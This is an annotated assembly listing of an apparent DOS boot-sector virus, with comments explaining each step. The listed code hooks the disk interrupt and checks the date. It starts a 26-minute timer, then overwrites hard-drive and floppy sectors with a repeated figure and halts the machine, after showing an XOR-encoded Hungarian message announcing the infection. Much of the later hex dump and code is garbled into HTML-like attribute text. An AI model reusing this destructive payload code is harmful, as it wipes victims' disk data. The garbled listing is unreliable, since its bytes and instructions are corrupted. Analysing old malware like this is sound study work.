TOP:0AC5  BA8000         MOV    DX,0080
TOP:0AC8  0E             PUSH   CS
TOP:0AC9  07             POP    ES
TOP:0ACA  9C             PUSHF
TOP:0ACB  0E             PUSH   CS
TOP:0ACC  E8C4F6         CALL   0193            ; Call original INT13

TOP:0ACF  2E8E06680B     MOV    ES,CS:[0B68]    ; Load segment of this code
TOP:0AD4  26C706B20A0000 MOV    ES:[0AB2],0000  ; Clear DMF1
TOP:0ADB  7210           JC     0AED
TOP:0ADD  2EA1000F       MOV    AX,CS:[0F00]    ; Check that sector
TOP:0AE1  3C23           CMP    AL,23
TOP:0AE3  7508           JNZ    0AED            ; If the 1st byte == 0x23
TOP:0AE5  268826B20A     MOV    ES:[0AB2],AH    ; Set DMF1 to the 2nd byte
TOP:0AEA  EB01           JMP    0AED
TOP:0AEC  90             NOP

                                                ; Decode data (text & figure)
TOP:0AED  2E8E06680B   * MOV    ES,CS:[0B68]    ; Load segment of this code
TOP:0AF2  BB470C         MOV    BX,0C47
TOP:0AF5  B96801         MOV    CX,0168
TOP:0AF8  268A07         MOV    AL,ES:[BX]
TOP:0AFB  3C20           CMP    AL,20           ; If already decoded
TOP:0AFD  750B           JNZ    0B0A
TOP:0AFF  268A07         MOV    AL,ES:[BX]
TOP:0B02  3445           XOR    AL,45
TOP:0B04  268807         MOV    ES:[BX],AL
TOP:0B07  43             INC    BX
TOP:0B08  E2F5           LOOP   0AFF

TOP:0B0A  B525           MOV    CH,25           ; Load CMOS date, if possible
TOP:0B0C  B404           MOV    AH,04
TOP:0B0E  CD1A           INT    1A
TOP:0B10  7212           JC     0B24
TOP:0B12  80F989         CMP    CL,89
TOP:0B15  720D           JC     0B24
TOP:0B17  80FD25         CMP    CH,25
TOP:0B1A  7413           JZ     0B2F
TOP:0B1C  80FE07         CMP    DH,07
TOP:0B1F  730E           JNC    0B2F
TOP:0B21  EB3C           JMP    0B5F
TOP:0B23  90             NOP

TOP:0B24  B054           MOV    AL,54           ; If error  or  year < 89="" top:0b26="" e643="" out="" [43],al="" top:0b28="" b0ff="" mov="" al,ff="" top:0b2a="" e641="" out="" [41],al="" top:0b2c="" eb31="" jmp="" 0b5f="" top:0b2e="" 90="" nop="" ;="" if="" xt="" or="" month="">= 7
TOP:0B2F  26803EB20A02   CMP    ES:[0AB2],02    ; Check DMF1
TOP:0B35  7428           JZ     0B5F

TOP:0B37  B80000         MOV    AX,0000         ; Save INT 1C vector
TOP:0B3A  2E8E1E680B     MOV    DS,CS:[0B68]    ; Load segment of this code
TOP:0B3F  8EC0           MOV    ES,AX
TOP:0B41  26A17000       MOV    AX,ES:[0070]
TOP:0B45  A36D0B         MOV    [0B6D],AX
TOP:0B48  26A17200       MOV    AX,ES:[0072]
TOP:0B4C  A36F0B         MOV    [0B6F],AX

TOP:0B4F  B8740B         MOV    AX,0B74         ; Set INT 1C vector to CS:0B74
TOP:0B52  26A37000       MOV    ES:[0070],AX
TOP:0B56  2EA1680B       MOV    AX,CS:[0B68]
TOP:0B5A  268C1E7200     MOV    ES:[0072],DS

TOP:0B5F  5E           * POP    SI
TOP:0B60  5F             POP    DI
TOP:0B61  1F             POP    DS
TOP:0B62  07             POP    ES
TOP:0B63  5A             POP    DX
TOP:0B64  59             POP    CX
TOP:0B65  5B             POP    BX
TOP:0B66  58             POP    AX
TOP:0B67  C3             RET

TOP:0B68  6310           DW     1063            ; segment of this code
TOP:0B6A  0000           DW     0

TOP:0B6C  EA53FF00F0     JMP    F000:FF53       ; Original vector of INT 1C

TOP:0B71  00             DB     0
TOP:0B72  A55E           DW     7080            ; number of 18.2 ticks (26 min)


                                                ; INT 1C Entry Point
TOP:0B74  9C             PUSHF                  ; Save registers
TOP:0B75  50             PUSH   AX
TOP:0B76  53             PUSH   BX
TOP:0B77  51             PUSH   CX
TOP:0B78  52             PUSH   DX
TOP:0B79  1E             PUSH   DS
TOP:0B7A  0E             PUSH   CS
TOP:0B7B  1F             POP    DS
TOP:0B7C  B90200         MOV    CX,0002
TOP:0B7F  BBC203         MOV    BX,03C2
TOP:0B82  2E8A07         MOV    AL,CS:[BX]
TOP:0B85  3C90           CMP    AL,90
TOP:0B87  7503           JNZ    0B8C
TOP:0B89  E99FF7         JMP    032B            ; Jump to original RESET vector
TOP:0B8C  E82EF8       * CALL   03BD
TOP:0B8F  7205           JC     0B96
TOP:0B91  E2F9           LOOP   0B8C
TOP:0B93  E995F7         JMP    032B            ; Jump to original RESET vector

TOP:0B96  1F           * POP    DS              ; Measure 26 minutes
TOP:0B97  2EA1720B       MOV    AX,CS:[0B72]
TOP:0B9B  48             DEC    AX
TOP:0B9C  2EA3720B     * MOV    CS:[0B72],AX
TOP:0BA0  7407           JZ     0BA9
TOP:0BA2  5A             POP    DX
TOP:0BA3  59             POP    CX
TOP:0BA4  5B             POP    BX
TOP:0BA5  58             POP    AX
TOP:0BA6  9D             POPF
TOP:0BA7  EBC3           JMP    0B6C            ; Jump to original INT 1C

TOP:0BA9  B88070       * MOV    AX,7080         ; New value for measuring
                                                ;  (26 minutes)
TOP:0BAC  2EC606B30A01   MOV    CS:[0AB3],01    ; Load 1 to DMF2
TOP:0BB2  40             INC    AX
TOP:0BB3  EBE7           JMP    0B9C

TOP:0BB5  BB470C       * MOV    BX,0C47         ; Decode data (text & figure)
TOP:0BB8  B96801         MOV    CX,0168
TOP:0BBB  2E8A07         MOV    AL,CS:[BX]
TOP:0BBE  3C20           CMP    AL,20           ; If already decoded
TOP:0BC0  740B           JZ     0BCD
TOP:0BC2  2E8A07         MOV    AL,CS:[BX]
TOP:0BC5  3445           XOR    AL,45
TOP:0BC7  2E8807         MOV    CS:[BX],AL
TOP:0BCA  43             INC    BX
TOP:0BCB  E2F5           LOOP   0BC2

TOP:0BCD  0E           * PUSH   CS
TOP:0BCE  1F             POP    DS
TOP:0BCF  2E803EB20A01   CMP    CS:[0AB2],01    ; Check DMF1
TOP:0BD5  7450           JZ     0C27

                                                ; Fill 0x24 * 0x80 (9 sector)
                                                ;  bytes with laughing figure
TOP:0BD7  BE2F0D         MOV    SI,0D2F         ; SI=One figure address
TOP:0BDA  BF000F         MOV    DI,0F00
TOP:0BDD  B98000         MOV    CX,0080
TOP:0BE0  B224           MOV    DL,24
TOP:0BE2  0E             PUSH   CS
TOP:0BE3  07             POP    ES
TOP:0BE4  0E             PUSH   CS
TOP:0BE5  1F             POP    DS
TOP:0BE6  FC             CLD
TOP:0BE7  F3A4         * REP    MOVSB           ; Copy 0x80 bytes
TOP:0BE9  81EE8000       SUB    SI,0080
TOP:0BED  B98000         MOV    CX,0080
TOP:0BF0  FECA           DEC    DL
TOP:0BF2  75F3           JNZ    0BE7            ; Repeat it

TOP:0BF4  BA8001         MOV    DX,0180         ; Write figures to the
TOP:0BF7  B80903         MOV    AX,0309         ; 1st har drive.
TOP:0BFA  B90200         MOV    CX,0002         ; Head=1, from the 2nd sect.
TOP:0BFD  BB000F         MOV    BX,0F00
TOP:0C00  9C             PUSHF
TOP:0C01  0E             PUSH   CS
TOP:0C02  E88EF5         CALL   0193            ; Call original INT13

TOP:0C05  BA8002         MOV    DX,0280         ; Write figures to the
TOP:0C08  B80903         MOV    AX,0309         ; 1st har drive.
TOP:0C0B  B90200         MOV    CX,0002         ; Head=2, from the 2nd sect.
TOP:0C0E  BB000F         MOV    BX,0F00
TOP:0C11  9C             PUSHF
TOP:0C12  0E             PUSH   CS
TOP:0C13  E87DF5         CALL   0193            ; Call original INT13

TOP:0C16  BA0000         MOV    DX,0000         ; Write figures to the
TOP:0C19  B80903         MOV    AX,0309         ; floppy
TOP:0C1C  B90100         MOV    CX,0001         ; Head=0, from the 1st sect.
TOP:0C1F  BB000F         MOV    BX,0F00
TOP:0C22  9C             PUSHF
TOP:0C23  0E             PUSH   CS
TOP:0C24  E86CF5         CALL   0193            ; Call original INT13

TOP:0C27  BE470C       * MOV    SI,0C47         ; Load address of text
TOP:0C2A  B002           MOV    AL,02           ; Clear Screen
TOP:0C2C  B400           MOV    AH,00
TOP:0C2E  CD10           INT    10

TOP:0C30  2E8A04         MOV    AL,CS:[SI]      ; Write text
TOP:0C33  3C00           CMP    AL,00
TOP:0C35  740C           JZ     0C43
TOP:0C37  B40E           MOV    AH,0E
TOP:0C39  BB0000         MOV    BX,0000
TOP:0C3C  56             PUSH   SI
TOP:0C3D  CD10           INT    10
TOP:0C3F  5E             POP    SI
TOP:0C40  46             INC    SI
TOP:0C41  EBED           JMP    0C30

TOP:0C43  FA           * CLI                    ; Halt processor
TOP:0C44  F4             HLT
TOP:0C45  EBFC           JMP    0C43

                                        ; Coded data area, XORed by 0x45

TOP:0C47                           65 65 65 0D 24 2D 24 69           eee.$-$i
TOP:0C4F   33 E4 37 30 36 65 33 24 2B 65 24 65 22 C7 35 27   3.706e3$+e$e".5'
TOP:0C5F   20 2B 64 64 48 4F 00 3F 65 20 22 3C 65 20 21 21    +ddHO.?e "<e !!="" top:0c6f="" 2c="" 22="" 65="" 28="" c7="" 22="" 65="" 2b="" 20="" 28="" 65="" 2e="" d1="" 3f="" 2c="" 36="" ,"e(."e+="" (e..?,6="" top:0c7f="" 28="" 20="" 37="" 31="" 65="" 33="" e4="" 37="" 30="" 36="" 6b="" 65="" 01="" 20="" 65="" 2d="" (="" 71e3.706ke.="" e-="" top:0c8f="" 24="" 28="" 24="" 37="" 2a="" 36="" 24="" 2b="" 65="" 24="" 3f="" 65="" 29="" 20="" 36="" 3f="" $($7*6$+e$?e)="" 6?="" top:0c9f="" 6b="" 48="" 4f="" 04="" 65="" 2b="" 20="" 33="" 20="" 65="" 20="" 22="" 3c="" 36="" 3f="" 20="" kho.e+="" 3="" e=""></e><6? top:0caf="" 37="" c4="" 20="" 2b="" 65="" 31="" d1="" 29="" 31="" d1="" 22="" 20="" 31="" d1="" 65="" 48="" 7.="" +e1.)1."="" 1.eh="" top:0cbf="" 4f="" 00="" 3f="" 31="" 65="" 24="" 65="" 2b="" 20="" 33="" c7="" 31="" 65="" 2a="" 2b="" 2b="" o.?1e$e+="" 3.1e*++="" top:0ccf="" 24="" 2b="" 65="" 2e="" 24="" 35="" 31="" 24="" 69="" 65="" 2d="" 2a="" 22="" 3c="" 65="" 23=""></6?><e# top:0cdf="" 20="" 29="" 31="" d1="" 29="" 31="" d1="" 22="" 20="" 31="" 2c="" 65="" 24="" 65="" 03="" 04="" )1.)1."="" 1,e$e..="" top:0cef="" 11="" 68="" 31="" e5="" 27="" 29="" e5="" 31="" 65="" 2e="" d1="" 29="" d1="" 2b="" 27="" d1="" .h1.').1e..).+'.="" top:0dff="" 3f="" d1="" 65="" 24="" 29="" 24="" 2e="" 3f="" 24="" 31="" 2a="" 2e="" 2e="" 24="" 29="" 6b="" e$)$.?$1*..$)k="" top:0d0f="" 48="" 4f="" 00="" 3f="" 65="" 28="" e5="" 37="" 65="" 28="" 20="" 22="" 65="" 2c="" 36="" 65="" ho.?e(.7e(="" "e,6e="" top:0d1f="" 31="" d1="" 37="" 31="" c7="" 2b="" 31="" 65="" 64="" 64="" 64="" 65="" 48="" 4f="" 45="" 45="" 1.71.+1edddehoee="" top:0d2f="" 65="" 65="" 65="" 65="" 65="" 65="" 65="" 65="" 65="" 65="" 65="" 65="" 65="" 65="" 65="" 65="" eeeeeeeeeeeeeeee="" top:0d3f="" 65="" 44="" 44="" 44="" 44="" 44="" 44="" 65="" 65="" 44="" 44="" 44="" 44="" 44="" 44="" 65="" eddddddeedddddde="" top:0d4f="" 44="" 65="" 65="" 65="" 65="" 65="" 65="" 44="" 44="" 65="" 65="" 65="" 65="" 65="" 65="" 44="" deeeeeeddeeeeeed="" top:0d5f="" 44="" 65="" 44="" 65="" 65="" 44="" 65="" 44="" 44="" 65="" 44="" 65="" 65="" 44="" 65="" 44="" dedeededdedeeded="" top:0d6f="" 44="" 65="" 65="" 65="" 65="" 65="" 65="" 44="" 44="" 65="" 65="" 65="" 65="" 65="" 65="" 44="" deeeeeeddeeeeeed="" top:0d7f="" 44="" 65="" 44="" 44="" 44="" 44="" 65="" 44="" 44="" 65="" 44="" 44="" 44="" 44="" 65="" 44="" deddddeddedddded="" top:0d8f="" 65="" 44="" 65="" 65="" 65="" 65="" 44="" 65="" 65="" 44="" 65="" 65="" 65="" 65="" 44="" 65="" edeeeedeedeeeede="" top:0d9f="" 65="" 65="" 44="" 44="" 44="" 44="" 65="" 65="" 65="" 65="" 44="" 44="" 44="" 44="" 65="" 65="" eeddddeeeeddddee="" ;="" the="" decoded="" data="" top:0c47="" 20="" 20="" 20="" 48="" 61="" 68="" 61="" 2c="" haha,="" top:0c4f="" 76="" a1="" 72="" 75="" 73="" 20="" 76="" 61="" 6e="" 20="" 61="" 20="" 67="" 82="" 70="" 62="" v.rus="" van="" a="" g.pb="" top:0c5f="" 65="" 6e="" 21="" 21="" 0d="" 0a="" 45="" 7a="" 20="" 65="" 67="" 79="" 20="" 65="" 64="" 64="" en!!..ez="" egy="" edd="" top:0c6f="" 69="" 67="" 20="" 6d="" 82="" 67="" 20="" 6e="" 65="" 6d="" 20="" 6b="" 94="" 7a="" 69="" 73="" ig="" m.g="" nem="" k.zis="" top:0c7f="" 6d="" 65="" 72="" 74="" 20="" 76="" a1="" 72="" 75="" 73="" 2e="" 20="" 44="" 65="" 20="" 68="" mert="" v.rus.="" de="" h="" top:0c8f="" 61="" 6d="" 61="" 72="" 6f="" 73="" 61="" 6e="" 20="" 61="" 7a="" 20="" 6c="" 65="" 73="" 7a="" amarosan="" az="" lesz="" top:0c9f="" 2e="" 0d="" 0a="" 41="" 20="" 6e="" 65="" 76="" 65="" 20="" 65="" 67="" 79="" 73="" 7a="" 65="" ...a="" neve="" egysze="" top:0caf="" 72="" 81="" 65="" 6e="" 20="" 74="" 94="" 6c="" 84="" 94="" 67="" 65="" 74="" 94="" 20="" 0d="" r.en="" t.l..get.="" .="" top:0cbf="" 0a="" 45="" 7a="" 74="" 20="" 61="" 20="" 6e="" 65="" 76="" 82="" 74="" 20="" 6f="" 6e="" 6e="" .ezt="" a="" nev.t="" onn="" top:0ccf="" 61="" 6e="" 20="" 6b="" 61="" 70="" 74="" 61="" 2c="" 20="" 68="" 6f="" 67="" 79="" 20="" 66="" an="" kapta,="" hogy="" f="" top:0cdf="" 65="" 6c="" 74="" 94="" 6c="" 74="" 94="" 67="" 65="" 74="" 69="" 20="" 61="" 20="" 46="" 41="" elt.lt.geti="" a="" fa="" top:0cef="" 54="" 2d="" 74="" a0="" 62="" 6c="" a0="" 74="" 20="" 6b="" 94="" 6c="" 94="" 6e="" 62="" 94="" t-t.bl.t="" k.l.nb.="" top:0dff="" 7a="" 94="" 20="" 61="" 6c="" 61="" 6b="" 7a="" 61="" 74="" 6f="" 6b="" 6b="" 61="" 6c="" 2e="" z.="" alakzatokkal.="" top:0d0f="" 0d="" 0a="" 45="" 7a="" 20="" 6d="" a0="" 72="" 20="" 6d="" 65="" 67="" 20="" 69="" 73="" 20="" ..ez="" m.r="" meg="" is="" top:0d1f="" 74="" 94="" 72="" 74="" 82="" 6e="" 74="" 20="" 21="" 21="" 21="" 20="" 0d="" 0a="" 00="" 00="" t.rt.nt="" !!!="" ....="" top:0d2f="" 20="" 20="" 20="" 20="" 20="" 20="" 20="" 20="" 20="" 20="" 20="" 20="" 20="" 20="" 20="" 20="" top:0d3f="" 20="" 01="" 01="" 01="" 01="" 01="" 01="" 20="" 20="" 01="" 01="" 01="" 01="" 01="" 01="" 20="" ......="" ......="" top:0d4f="" 01="" 20="" 20="" 20="" 20="" 20="" 20="" 01="" 01="" 20="" 20="" 20="" 20="" 20="" 20="" 01="" .="" ..="" .="" top:0d5f="" 01="" 20="" 01="" 20="" 20="" 01="" 20="" 01="" 01="" 20="" 01="" 20="" 20="" 01="" 20="" 01="" .="" .="" .="" ..="" .="" .="" .="" top:0d6f="" 01="" 20="" 20="" 20="" 20="" 20="" 20="" 01="" 01="" 20="" 20="" 20="" 20="" 20="" 20="" 01="" .="" ..="" .="" top:0d7f="" 01="" 20="" 01="" 01="" 01="" 01="" 20="" 01="" 01="" 20="" 01="" 01="" 01="" 01="" 20="" 01="" .="" ....="" ..="" ....="" .="" top:0d8f="" 20="" 01="" 20="" 20="" 20="" 20="" 01="" 20="" 20="" 01="" 20="" 20="" 20="" 20="" 01="" 20="" .="" .="" .="" .="" top:0d9f="" 20="" 20="" 01="" 01="" 01="" 01="" 20="" 20="" 20="" 20="" 01="" 01="" 01="" 01="" 20="" 20="" ....="" ....="" top:0daf="" 00e2="" add="" dl,ah="" top:0db1="" 83c605="" add="" si,0005="" top:0db4="" fec8="" dec="" al="" top:0db6="" 75ed="" jnz="" 0da5="" top:0db8="" 2ec706df080700="" mov="" cs:[08df],0007="" top:0dbf="" b001="" mov="" al,01="" top:0dc1="" b4ff="" mov="" ah,ff="" top:0dc3="" eb0b="" jmp="" 0dd0="" top:0dc5="" 2ec706df080900="" mov="" cs:[08df],0009="" top:0dcc="" b003="" mov="" al,03="" top:0dce="" b4ff="" mov="" ah,ff="" top:0dd0="" e89efc="" call="" 0a71="" top:0dd3="" 5e="" pop="" si="" top:0dd4="" 5a="" pop="" dx="" top:0dd5="" 59="" pop="" cx="" top:0dd6="" 58="" pop="" ax="" top:0dd7="" c3="" ret="" top:0dd8="" 9c="" pushf="" top:0dd9="" 2ef606eb0802="" test="" cs:[08eb],02="" top:0ddf="" 7502="" jnz="" 0de3="" top:0de1="" 9d="" popf="" top:0de2="" c3="" ret="" top:0de3="" 9d="" popf="" top:0de4="" 7002="" jo="" 0de8="" top:0de6="" f8="" clc="" top:0de7="" c3="" ret="" top:0de8="" f9="" stc="" top:0de9="" c3="" ret="" top:0dea="" 3c30="" cmp="" al,30="" top:0dec="" 7208="" jc="" 0df6="" top:0dee="" 3c39="" cmp="" al,39="" top:0df0="" 7704="" ja="" 0df6="" top:0df2="" 2c30="" sub="" al,30="" top:0df4="" f8="" clc="" top:0df5="" c3="" ret="" top:0df6="" f9="" stc="" top:0df7="" c3="" ret="" top:0df8="" 50="" push="" ax="" top:0df9="" 53="" push="" bx="" top:0dfa="" 52="" push="" dx="" top:0dfb="" 57="" push="" di="" top:0dfc="" 268b7f06="" mov="" di,es:[bx+06]="" top:0e00="" 268a05="" mov="" al,es:[di]="" top:0e03="" 0ac0="" or="" al,al="" top:0e05="" 7504="" jnz="" 0e0b="" top:0e07="" b4ff="" mov="" ah,ff="" top:0e09="" eb4c="" jmp="" 0e57="" top:0e0b="" 3c03="" cmp="" al,03="" top:0e0d="" 753f="" jnz="" 0e4e="" top:0e0f="" 47="" inc="" di="" top:0e10="" 268a05="" mov="" al,es:[di]="" top:0e13="" b409="" mov="" ah,09="" top:0e15="" f6e4="" mul="" ah="" top:0e17="" 40="" inc="" ax="" top:0e18="" 03f8="" add="" di,ax="" top:0e1a="" 268a05="" mov="" al,es:[di]="" top:0e1d="" b405="" mov="" ah,05="" top:0e1f="" f6e4="" mul="" ah="" top:0e21="" 40="" inc="" ax="" top:0e22="" 03f8="" add="" di,ax="" top:0e24="" 268a05="" mov="" al,es:[di]="" top:0e27="" 47="" inc="" di="" top:0e28="" 47="" inc="" di="" top:0e29="" 268b2d="" mov="" bp,es:[di]="" top:0e2c="" e83200="" call="" 0e61="" top:0e2f="" 7312="" jnc="" 0e43="" top:0e31="" 83c703="" add="" di,0003="" top:0e34="" fec8="" dec="" al="" top:0e36="" 75f1="" jnz="" 0e29="" top:0e38="" 2ec706df080800="" mov="" cs:[08df],0008="" top:0e3f="" b4ff="" mov="" ah,ff="" top:0e41="" eb14="" jmp="" 0e57="" top:0e43="" 268a65ff="" mov="" ah,es:[di-01]="" top:0e47="" b002="" mov="" al,02="" top:0e49="" 268b15="" mov="" dx,es:[di]="" top:0e4c="" eb0b="" jmp="" 0e59="" top:0e4e="" 2ec706df080900="" mov="" cs:[08df],0009="" top:0e55="" b4ff="" mov="" ah,ff="" top:0e57="" b003="" mov="" al,03="" top:0e59="" e815fc="" call="" 0a71="" top:0e5c="" 5f="" pop="" di="" top:0e5d="" 5a="" pop="" dx="" top:0e5e="" 5b="" pop="" bx="" top:0e5f="" 58="" pop="" ax="" top:0e60="" c3="" ret="" top:0e61="" 50="" push="" ax="" top:0e62="" 55="" push="" bp="" top:0e63="" 52="" push="" dx="" top:0e64="" 56="" push="" si="" top:0e65="" b202="" mov="" dl,02="" top:0e67="" 2e8a04="" mov="" al,cs:[si]="" top:0e6a="" e8be05="" call="" 142b="" top:0e6d="" 723c="" jc="" 0eab="" top:0e6f="" e8d7fd="" call="" 0c49="" top:0e72="" 2ef606eb0808="" test="" cs:[08eb],08="" top:0e78="" 740d="" jz="" 0e87="" top:0e7a="" 3c3d="" cmp="" al,3d="" top:0e7c="" 751f="" jnz="" 0e9d="" top:0e7e="" 26807e0100="" cmp="" es:[bp+01],00="" top:0e83="" 7571="" jnz="" 0ef6="" top:0e85="" eb13="" jmp="" 0e9a="" top:0e87="" 2ef606eb0810="" test="" cs:[08eb],10="" top:0e8d="" 740e="" jz="" 0e9d="" top:0e8f="" 3c3a="" cmp="" al,3a="" top:0e91="" 750a="" jnz="" 0e9d="" top:0e93="" 26807e0000="" cmp="" es:[bp+00],00="" top:0e98="" 755c="" jnz="" 0ef6="" top:0e9a="" 46="" inc="" si="" top:0e9b="" eb5c="" jmp="" 0ef9="" top:0e9d="" 263a4600="" cmp="" al,es:[bp+00]="" top:0ea1="" 751d="" jnz="" 0ec0="" top:0ea3="" 0ac0="" or="" al,al="" top:0ea5="" 7452="" jz="" 0ef9="" top:0ea7="" 46="" inc="" si="" top:0ea8="" 45="" inc="" bp="" top:0ea9="" eb13="" jmp="" 0ebe="" top:0eab="" 263a4600="" cmp="" al,es:[bp+00]="" top:0eaf="" 7545="" jnz="" 0ef6="" top:0eb1="" 46="" inc="" si="" top:0eb2="" 2e8a04="" mov="" al,cs:[si]="" top:0eb5="" 45="" inc="" bp="" top:0eb6="" 263a4600="" cmp="" al,es:[bp+00]="" top:0eba="" 753a="" jnz="" 0ef6="" top:0ebc="" 46="" inc="" si="" top:0ebd="" 45="" inc="" bp="" top:0ebe="" eba7="" jmp="" 0e67="" top:0ec0="" 2ef606eb0840="" test="" cs:[08eb],40="" top:0ec6="" 740f="" jz="" 0ed7="" top:0ec8="" 26f747022000="" test="" es:[bx+02],0020="" top:0ece="" 7407="" jz="" 0ed7="" top:0ed0="" 26807e0000="" cmp="" es:[bp+00],00="" top:0ed5="" 7422="" jz="" 0ef9="" top:0ed7="" 26f7071000="" test="" es:[bx],0010="" top:0edc="" 7418="" jz="" 0ef6="" top:0ede="" 3c3a="" cmp="" al,3a="" top:0ee0="" 7509="" jnz="" 0eeb="" top:0ee2="" 26807e0000="" cmp="" es:[bp+00],00="" top:0ee7="" 750d="" jnz="" 0ef6="" top:0ee9="" eb0e="" jmp="" 0ef9="" top:0eeb="" 3c00="" cmp="" al,00="" top:0eed="" 7507="" jnz="" 0ef6="" top:0eef="" 26807e003a="" cmp="" es:[bp+00],3a="" top:0ef4="" 7403="" jz="" 0ef9="" top:0ef6="" f9="" stc="" top:0ef7="" eb06="" jmp="" 0eff="" top:0ef9="" 2e8936ee08="" mov="" cs:[08ee],si="" top:0efe="" f8="" clc="" top:0eff="" 5e="" pop="" si="" ;="" layout="" of="" the="" original="" ;="" boot="" sector="" top:0f00="" eb34="" jmp="" 0f36="" top:0f02="" 90="" nop="" top:0f03="" 49="" dec="" cx="" top:0f04="" 42="" inc="" dx="" top:0f05="" 4d="" dec="" bp="" top:0f06="" 2020="" and="" [bx+si],ah="" top:0f08="" 332e3200="" xor="" bp,[0032]="" top:0f0c="" 0202="" add="" al,[bp+si]="" top:0f0e="" 0100="" add="" [bx+si],ax="" top:0f10="" 027000="" add="" dh,[bx+si+00]="" top:0f13="" d002="" rol="" b/[bp+si],1="" top:0f15="" fd="" std="" top:0f16="" 0200="" add="" al,[bx+si]="" top:0f18="" 0900="" or="" [bx+si],ax="" top:0f1a="" 0200="" add="" al,[bx+si]="" top:0f1c="" 0000="" add="" [bx+si],al="" top:0f1e="" 0000="" add="" [bx+si],al="" top:0f20="" 0000="" add="" [bx+si],al="" top:0f22="" 0000="" add="" [bx+si],al="" top:0f24="" 0000="" add="" [bx+si],al="" top:0f26="" 0000="" add="" [bx+si],al="" top:0f28="" 0000="" add="" [bx+si],al="" top:0f2a="" 0000="" add="" [bx+si],al="" top:0f2c="" 0000="" add="" [bx+si],al="" top:0f2e="" 000f="" add="" [bx],cl="" top:0f30="" 0000="" add="" [bx+si],al="" top:0f32="" 0000="" add="" [bx+si],al="" top:0f34="" 0100="" add="" [bx+si],ax="" top:0f36="" fa="" cli="" top:0f37="" 33c0="" xor="" ax,ax="" top:0f39="" 8ed0="" mov="" ss,ax="" top:0f3b="" bc007c="" mov="" sp,7c00="" top:0f3e="" 16="" push="" ss="" top:0f3f="" 07="" pop="" es="" top:0f40="" bb7800="" mov="" bx,0078="" top:0f43="" 36c537="" lds="" si,ss:[bx]="" top:0f46="" 1e="" push="" ds="" top:0f47="" 56="" push="" si="" top:0f48="" 16="" push="" ss="" top:0f49="" 53="" push="" bx="" top:0f4a="" bf2b7c="" mov="" di,7c2b="" top:0f4d="" b90b00="" mov="" cx,000b="" top:0f50="" fc="" cld="" top:0f51="" ac="" lodsb="" top:0f52="" 26803d00="" cmp="" es:[di],00="" top:0f56="" 7403="" jz="" 0f5b="" top:0f58="" 268a05="" mov="" al,es:[di]="" top:0f5b="" aa="" stosb="" top:0f5c="" 8ac4="" mov="" al,ah="" top:0f5e="" e2f1="" loop="" 0f51="" top:0f60="" 06="" push="" es="" top:0f61="" 1f="" pop="" ds="" top:0f62="" 894702="" mov="" [bx+02],ax="" top:0f65="" c7072b7c="" mov="" [bx],7c2b="" top:0f69="" fb="" sti="" top:0f6a="" cd13="" int="" 13="" top:0f6c="" 7267="" jc="" 0fd5="" top:0f6e="" a0107c="" mov="" al,[7c10]="" top:0f71="" 98="" cbw="" top:0f72="" f726167c="" mul="" w/[7c16]="" top:0f76="" 03061c7c="" add="" ax,[7c1c]="" top:0f7a="" 03060e7c="" add="" ax,[7c0e]="" top:0f7e="" a33f7c="" mov="" [7c3f],ax="" top:0f81="" a3377c="" mov="" [7c37],ax="" top:0f84="" b82000="" mov="" ax,0020="" top:0f87="" f726117c="" mul="" w/[7c11]="" top:0f8b="" 8b1e0b7c="" mov="" bx,[7c0b]="" top:0f8f="" 03c3="" add="" ax,bx="" top:0f91="" 48="" dec="" ax="" top:0f92="" f7f3="" div="" bx="" top:0f94="" 0106377c="" add="" [7c37],ax="" top:0f98="" bb0005="" mov="" bx,0500="" top:0f9b="" a13f7c="" mov="" ax,[7c3f]="" top:0f9e="" e89600="" call="" 1037="" top:0fa1="" b80102="" mov="" ax,0201="" top:0fa4="" e8aa00="" call="" 1051="" top:0fa7="" 7219="" jc="" 0fc2="" top:0fa9="" 8bfb="" mov="" di,bx="" top:0fab="" b90b00="" mov="" cx,000b="" top:0fae="" becd7d="" mov="" si,7dcd="" top:0fb1="" f3a6="" rep="" cmpsb="" top:0fb3="" 750d="" jnz="" 0fc2="" top:0fb5="" 8d7f20="" lea="" di,[bx+20]="" top:0fb8="" bed87d="" mov="" si,7dd8="" top:0fbb="" b90b00="" mov="" cx,000b="" top:0fbe="" f3a6="" rep="" cmpsb="" top:0fc0="" 7418="" jz="" 0fda="" top:0fc2="" be6e7d="" mov="" si,7d6e="" top:0fc5="" e86100="" call="" 1029="" top:0fc8="" 32e4="" xor="" ah,ah="" top:0fca="" cd16="" int="" 16="" top:0fcc="" 5e="" pop="" si="" top:0fcd="" 1f="" pop="" ds="" top:0fce="" 8f04="" pop="" [si]="" top:0fd0="" 8f4402="" pop="" [si+02]="" top:0fd3="" cd19="" int="" 19="" top:0fd5="" beb77d="" mov="" si,7db7="" top:0fd8="" ebeb="" jmp="" 0fc5="" top:0fda="" a11c05="" mov="" ax,[051c]="" top:0fdd="" 33d2="" xor="" dx,dx="" top:0fdf="" f7360b7c="" div="" w/[7c0b]="" top:0fe3="" fec0="" inc="" al="" top:0fe5="" a23c7c="" mov="" [7c3c],al="" top:0fe8="" a1377c="" mov="" ax,[7c37]="" top:0feb="" a33d7c="" mov="" [7c3d],ax="" top:0fee="" bb0007="" mov="" bx,0700="" top:0ff1="" a1377c="" mov="" ax,[7c37]="" top:0ff4="" e84000="" call="" 1037="" top:0ff7="" a1187c="" mov="" ax,[7c18]="" top:0ffa="" 2a063b7c="" sub="" al,[7c3b]="" top:0ffe="" 40="" inc="" ax="" top:0fff="" 50="" push="" ax="" top:1000="" e84e00="" call="" 1051="" top:1003="" 58="" pop="" ax="" top:1004="" 72cf="" jc="" 0fd5="" top:1006="" 28063c7c="" sub="" [7c3c],al="" top:100a="" 760c="" jna="" 1018="" top:100c="" 0106377c="" add="" [7c37],ax="" top:1010="" f7260b7c="" mul="" w/[7c0b]="" top:1014="" 03d8="" add="" bx,ax="" top:1016="" ebd9="" jmp="" 0ff1="" top:1018="" 8a2e157c="" mov="" ch,[7c15]="" top:101c="" 8a16fd7d="" mov="" dl,[7dfd]="" top:1020="" 8b1e3d7c="" mov="" bx,[7c3d]="" top:1024="" ea00007000="" jmp="" 0070:0000="" top:1029="" ac="" lodsb="" top:102a="" 0ac0="" or="" al,al="" top:102c="" 7422="" jz="" 1050="" top:102e="" b40e="" mov="" ah,0e="" top:1030="" bb0700="" mov="" bx,0007="" top:1033="" cd10="" int="" 10="" top:1035="" ebf2="" jmp="" 1029="" top:1037="" 33d2="" xor="" dx,dx="" top:1039="" f736187c="" div="" w/[7c18]="" top:103d="" fec2="" inc="" dl="" top:103f="" 88163b7c="" mov="" [7c3b],dl="" top:1043="" 33d2="" xor="" dx,dx="" top:1045="" 